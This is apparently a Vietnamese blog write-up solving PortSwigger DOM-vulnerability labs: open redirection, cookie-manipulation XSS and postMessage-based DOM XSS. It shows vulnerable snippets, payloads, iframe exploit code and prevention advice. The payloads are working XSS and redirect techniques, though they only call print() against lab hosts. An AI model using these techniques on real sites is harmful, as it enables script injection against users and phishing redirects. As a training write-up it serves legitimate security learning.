---
title: "[PortSwigger Lab] - DOM Based Vulnerabilities"
description: Solution of DOM Based Vulnerabilities Lab
date: 2025-06-13 15:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, dom based]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-13-portswigger-lab-information-dom-based-vulnerabilities/dom-based-vulnerabilities.png
    alt: DOM Based Vulnerabilities
---

## Introduction
---
### **DOM Based Vulnerabilities**
- **DOM (Document Object Model)** là một mô hình dạng cây (cấu trúc phân cấp) mà trình duyệt web tạo ra để đại diện cho toàn bộ nội dung và cấu trúc của một trang web. Mỗi phần tử **HTML** (như `<div>`, `<p>`, `<a>`, v.v.) sẽ được biểu diễn như một nút **(node)** trong cây này.
- **DOM** cho phép **JavaScript** tương tác và thay đổi nội dung của trang web. Cụ thể, **JavaScript** có thể:
    - Truy cập các phần tử 
    - Thay đổi nội dung hoặc thuộc tính 
    - Thêm, sửa, hoặc xóa các phần tử **HTML** động

- **DOM-based vulnerability** là một loại lỗ hổng bảo mật xảy ra khi:
    - Trang web chứa **JavaScript** mà lấy dữ liệu do người dùng kiểm soát (gọi là **source**, ví dụ: `location.hash`, `document.URL`, `window.name`, v.v.)
    - Và sau đó truyền dữ liệu đó vào một hàm nguy hiểm (gọi là `sink`, ví dụ: `innerHTML`, `document.write`, `eval`, `setTimeout`,`...`).

### Taint Flow
- **Taint flow** là luồng dữ liệu không đáng tin cậy (thường do người dùng hoặc kẻ tấn công kiểm soát) chạy qua mã **JavaScript** từ một **source** (nguồn) đến một **sink** (đích), nơi dữ liệu đó được xử lý hoặc thực thi.
    - **"Taint"** có nghĩa là **"nhiễm bẩn"** – dữ liệu không sạch, có thể bị lợi dụng.
    - Nếu dữ liệu đó đi vào một hàm nguy hiểm mà không được **lọc/kiểm tra**, thì có thể gây ra lỗ hổng bảo mật.

- **Source** là những vị trí trong **JavaScript** mà dữ liệu từ phía người dùng hoặc kẻ tấn công có thể truy cập vào.
- **Sink** là nơi mà dữ liệu được xử lý, hiển thị, hoặc thực thi – và nếu dữ liệu đó bị nhiễm bẩn **(tainted)**, nó có thể gây ra hậu quả.

## Solve DOM Based Vulnerabilities
---
### Lab: DOM-based open redirection
- Truy cập đến 1 blog bất kỳ, inspect source ta thấy:

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
- Ứng dụng sẽ kiểm tra trên url có `url=http` không, nếu có thì khi **click** vào thẻ a này sẽ **redirect** đến đường đãn đó
- Thêm url vào request đến redirect đến **exploit server**

```
https://0a33001a0374320280b6030200c90007.web-security-academy.net/post?postId=3&url=https://exploit-0ae8006a03da3299806502e80186006b.exploit-server.net/
```

### Lab: DOM-based cookie manipulation
#### Analysis
- Đến 1 **blog** bất kì 
- Trở lại **home** ta thấy đường dẫn đến **Last viewed product**
- Click vào **Last viewed product** nó chuyển hướn ta đến trang vừa truy cập lúc nãy
- Quan sát source ta thấy **script** 

```html
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
- Ứng dụng đã **set cookie** `lastViewedProduct` bằng giá trị trên thanh **url** hiện tại **(window.location)**
- Quan sát ta thấy **Last viewed product** chứa href là giá trị của `lastViewedProduct`

```html
<a href="https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/product?productId=1">Last viewed product</a>
```
- Thử thay đổi request đến, reload lại page, kiểm tra lại **cookie** và **Last viewed product**

```html
<a href="https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/product?productId=1&amp;xnxx=1">Last viewed product</a>
```
- Ta thấy khi truy cập vào 1 **blog** kèm thêm **param** `xnxx` => kéo theo cookie được set lại => **Last viewed product** thay đổi

#### Exploit
- Thay đổi đường đãn thành và truy cập

```
https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/product?productId=1&xnxx=1'><script>print()</script>
```
- Click **Last viewed product** => XSS xảy ra
- Quan sát source gần **Last viewed product**

```html
<a href="https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/product?productId=1&amp;xnxx=1"><script>print()</script>'&gt;Last viewed product</a>
```
- Ta đã thoát khỏi thẻ `<a>` và thêm `script` phía sau
- Đến **exploit server** và dán **payload** sau và **Deliver to victim**

```html
<iframe src="https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/product?productId=1&xnxx=1'><script>print()</script>" onload="if (!window.x) this.src='https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/'; window.x=1;">
```
- Ban đầu load `https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/product?productId=1&xnxx=1'><script>print()</script>` vào thẻ **iframe** để set lại **cookie** cho **victim**
- Kiểm tra biến **global x** xem có, trường hợp này nó chưa tồn tại nên set lại **src** cho **iframe** làm nó load lại `https://0aaa00410394b637814d7fe400be006f.web-security-academy.net/` dẫn tới **XSS** xảy ra

### Lab: DOM XSS using web messages
#### Analysis
- Mở trang web => Quan sát thấy **[object Object]**
- **Inspect code** phần đó ra thấy **script**

```html
<div id="ads">[object Object]</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
- Ứng dụng sẽ lấy **message** từ cửa số khác hoặc từ chính nó để gán **innerHTML** cho **ads** element
- Mở **console** của **browser** tại chính trang đó, postMessage để kiểm tra

```js
postMessage("xnxx")
```
- **[object Object]** đã đổi thành `xnxx`
- Từ lỗ hổng này, ta thử thêm `payload xss` xem có thực thi không 

```js
postMessage("xnxx<img src=1 onerror=print()>") 
```
- Thành công do ứng dụng không **filter** 

#### Exploit
- Dán vào **body exploit server** và **deliver to victiom**

```html
<iframe src="https://0a0800bf041984b1804903730049002c.web-security-academy.net/" onload="this.contentWindow.postMessage('xnxx<img src=1 onerror=print()>','*')">
```
- Sau khi load trang web vào iframe => gửi message chứa payload => xss xảy ra
- Sử dụng `"*"`, vì muốn gửi cho tất cả chứ không còn gửi cho chính nó

### Lab: DOM XSS using web messages and a JavaScript URL
#### Analysis
- Mở trang web, **Inspect code** phần đó ra thấy **script**

```html
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
- Phân tích ta thấy hành vi của ứng dụng:
    - Nhận **message** từ **possMessage**
    - Chấp nhận **data** chứa `http:` hoặc `https:`, tức nó xuất hiện ở bất kỳ đâu trong **data**
- Sử dụng console trong browser để `postMessage("javascript:print('https:')") ` => XSS xảy ra

#### Exploit
- Dán vào **body exploit server** và **deliver to victiom**

```html
<iframe src="https://0a0800bf041984b1804903730049002c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```
- Hoặc

```html
<iframe src="https://0a0800bf041984b1804903730049002c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print(\'http:\')','*')">
```
- Để tránh lỗi, cần escape dấu nháy đơn bên trong chuỗi bằng `\'`, khiến **JavaScript** hiểu đó là một dấu nháy đơn nằm trong chuỗi, không phải là điểm kết thúc chuỗi.
- Sau khi load trang web vào iframe => gửi message chứa payload => xss xảy ra
- Sử dụng `"*"`, vì muốn gửi cho tất cả chứ không còn gửi cho chính nó

### Lab: DOM XSS using web messages and JSON.parse
#### Analysis
- Mở trang web, **Inspect code** phần đó ra thấy **script**

```html
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
- Phân tích ta thấy hành vi của ứng dụng:
    - **Parse json** trả về `d`
    - Phân loại dựa trên `d.type`

```js
const payload = JSON.stringify({
  type: 'load-channel',
  url: 'javascript:print()'
});

postMessage(payload);
```
- Sử dụng **console** của **browser** để thử => XSS xảy ra

#### Exploit
- Dán vào **body exploit server** và **deliver to victiom**

```html
<iframe src="https://0a1e0033041a32c780edd57100620015.web-security-academy.net/" 
        onload="this.contentWindow.postMessage(JSON.stringify({ 
            type: 'load-channel', 
            url: 'javascript:print()' 
        }), '*')">
</iframe>
```
- Hoặc

```html
<iframe src=https://0a1e0033041a32c780edd57100620015.web-security-academy.net/ 
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

- Sau khi load trang web vào iframe => gửi message chứa payload => xss xảy ra
- Sử dụng `"*"`, vì muốn gửi cho tất cả chứ không còn gửi cho chính nó

## Prevent
---
1. Không cho phép dữ liệu không đáng tin **(untrusted data)** đi vào **sink**
2. Sử dụng **whitelist**
3. **Sanitize** hoặc **encode** dữ liệu
4. Không sử dụng các hàm nguy hiểm nếu không cần thiết
5. Kiểm tra ngữ cảnh dữ liệu được sử dụng

---
Goodluck! 🍀🍀🍀 
